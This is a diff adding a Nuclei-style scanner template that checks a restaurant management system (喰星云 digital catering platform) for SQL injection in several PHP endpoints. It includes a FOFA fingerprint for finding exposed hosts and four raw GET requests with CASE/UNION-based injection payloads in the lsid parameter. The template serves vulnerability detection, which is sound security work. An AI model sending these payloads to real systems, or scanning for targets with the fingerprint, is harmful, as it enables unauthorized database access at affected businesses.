@@ -1,0 +1,47 @@
+id: canxingyun-not_out_depot-shelflife-not_finish-stock-sql
+
+info:
+  name: 喰星云·数字化餐饮服务系统 多处 SQL注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: body="tmp_md5_pwd"
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /logistics/home_warning/php/not_out_depot.php?do=getList&lsid=(SELECT%20(CASE%20WHEN%20(5630=5631)%20THEN%202%20ELSE%20(SELECT%207330%20UNION%20SELECT%203010)%20END)) HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /logistics/home_warning/php/shelflife.php?do=getList&lsid=%28SELECT+%28CASE+WHEN+%289764%3D9765%29+THEN+%27%27+ELSE+%28SELECT+7700+UNION+SELECT+3389%29+END%29%29 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /logistics/home_warning/php/not_finish.php?do=getList&lsid=%28SELECT+%28CASE+WHEN+%289764%3D9765%29+THEN+%27%27+ELSE+%28SELECT+7700+UNION+SELECT+3389%29+END%29%29 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /logistics/home_warning/php/stock.php?do=getList&lsid=%28SELECT+%28CASE+WHEN+%289764%3D9765%29+THEN+%27%27+ELSE+%28SELECT+7700+UNION+SELECT+3389%29+END%29%29 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '服务器内部错误，请与管理员联系，谢谢'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
+
+
+
+
